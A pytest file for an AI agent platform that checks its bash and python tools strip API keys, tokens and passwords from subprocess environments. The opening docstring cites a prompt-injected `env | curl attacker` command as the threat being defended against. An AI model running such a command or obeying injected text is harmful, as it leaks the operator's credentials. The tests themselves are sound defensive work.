"""Agent bash/python subprocesses must not inherit server secrets.

src/tool_execution.py builds `_subproc_env` from the server's own environment;
before the strip, a prompt-injected `env | curl attacker` (or any child that
phones home) saw every provider API key the server was launched with.

Pins:
  - _strip_secret_env drops *_KEY / *_TOKEN / *_SECRET / *_PASSWORD /
    PAIOS_INTERNAL* + explicit names (OPENAI_API_KEY etc.)
  - Cowork toolchain vars survive (PATH, HOME, VIRTUAL_ENV, PYTHONPATH,
    TERM, non-secret HF_* cache paths, LANG)
  - end-to-end: the bash and python tools genuinely cannot see a secret
  - workspace-venv PATH/VIRTUAL_ENV/PYTHONPATH layering is unchanged
"""
import os
import sys
import tempfile

from src.tool_execution import _strip_secret_env, _direct_fallback


# ── unit: the filter itself ────────────────────────────────────────────────

def test_strips_secret_shaped_names():
    env = {
        "OPENAI_API_KEY": "sk-live",
        "ANTHROPIC_API_KEY": "sk-ant",
        "MY_SERVICE_TOKEN": "tok",
        "GH_TOKEN": "ghp_x",
        "DB_PASSWORD": "hunter2",
        "OLD_PASSWD": "hunter1",
        "STRIPE_SECRET": "sk_live",
        "AWS_SECRET_ACCESS_KEY": "aws",
        "AWS_SESSION_TOKEN": "aws2",
        "HF_TOKEN": "hf_x",
        "PAIOS_INTERNAL": "1",
        "PAIOS_INTERNAL_WEBHOOK": "hook",
        "GOOGLE_APPLICATION_CREDENTIALS": "/path/creds.json",
    }
    assert _strip_secret_env(env) == {}


def test_keeps_cowork_toolchain_vars():
    env = {
        "PATH": "/usr/bin",
        "HOME": "/Users/me",
        "VIRTUAL_ENV": "/ws/.venv",
        "PYTHONPATH": "/ws",
        "TERM": "xterm",
        "COLUMNS": "120",
        "LINES": "40",
        "LANG": "en_US.UTF-8",
        "TMPDIR": "/tmp",
        "USER": "me",
        "SHELL": "/bin/zsh",
        # Non-secret HF cache/config vars must survive (HF_TOKEN must not).
        "HF_HOME": "/Users/me/.cache/huggingface",
        "HF_HUB_CACHE": "/Users/me/.cache/huggingface/hub",
        # Non-secret PAIOS_* vars are untouched (only PAIOS_INTERNAL* strips).
        "PAIOS_DATA_DIR": "/srv/data",
        "npm_config_cache": "/Users/me/.npm",
        "GIT_EDITOR": "true",
    }
    assert _strip_secret_env(dict(env)) == env


def test_mixed_env_partitions_correctly():
    env = {"PATH": "/usr/bin", "OPENAI_API_KEY": "sk", "EDITOR": "vim"}
    out = _strip_secret_env(env)
    assert out == {"PATH": "/usr/bin", "EDITOR": "vim"}


def test_case_insensitive_matching():
    out = _strip_secret_env({"openai_api_key": "sk", "widget_token": "t", "path": "/x"})
    assert "openai_api_key" not in out
    assert "widget_token" not in out
    assert out["path"] == "/x"  # keep-list also matches case-insensitively


# ── end-to-end: the actual bash / python tools ─────────────────────────────

async def test_bash_tool_cannot_see_secrets(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-SHOULD-NEVER-LEAK")
    monkeypatch.setenv("PAIOS_INTERNAL_SIGNING_SECRET", "sig-SHOULD-NEVER-LEAK")
    monkeypatch.setenv("SAFE_MARKER_VAR", "safe-visible")
    res = await _direct_fallback("bash", "env")
    assert res.get("exit_code") == 0, res
    out = res["output"]
    assert "SHOULD-NEVER-LEAK" not in out
    assert "OPENAI_API_KEY" not in out
    assert "PAIOS_INTERNAL_SIGNING_SECRET" not in out
    # Non-secret vars still flow through, and the toolchain env is intact.
    assert "safe-visible" in out
    assert "PATH=" in out


async def test_python_tool_cannot_see_secrets(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-SHOULD-NEVER-LEAK")
    res = await _direct_fallback(
        "python",
        "import os; print(repr(os.environ.get('ANTHROPIC_API_KEY'))); print('HOME' in os.environ)",
    )
    assert res.get("exit_code") == 0, res
    assert "None" in res["output"]
    assert "SHOULD-NEVER-LEAK" not in res["output"]
    assert "True" in res["output"]  # HOME preserved


async def test_workspace_venv_layering_survives_strip(monkeypatch):
    """Cowork regression guard: the workspace's own venv still lands at the
    front of PATH with VIRTUAL_ENV set, and the workspace root goes on
    PYTHONPATH — the strip must not disturb the venv wiring."""
    monkeypatch.setenv("OPENAI_API_KEY", "sk-SHOULD-NEVER-LEAK")
    ws = tempfile.mkdtemp()
    bin_name = "Scripts" if os.name == "nt" else "bin"
    venv_bin = os.path.join(ws, ".venv", bin_name)
    os.makedirs(venv_bin)
    res = await _direct_fallback(
        "bash",
        'echo "VE=$VIRTUAL_ENV"; echo "PP=$PYTHONPATH"; echo "PATH=$PATH"; echo "KEY=[$OPENAI_API_KEY]"',
        workspace=ws,
    )
    assert res.get("exit_code") == 0, res
    out = res["output"]
    assert f"VE={os.path.join(ws, '.venv')}" in out
    assert f"PP={ws}" in out
    assert venv_bin in out.split("PATH=", 1)[1]
    # PiAOS's own interpreter dir is appended too (pytest fallback).
    piaos_bin = os.path.dirname(sys.executable or "")
    if piaos_bin:
        assert piaos_bin in out.split("PATH=", 1)[1]
    assert "KEY=[]" in out  # secret stripped even inside a workspace
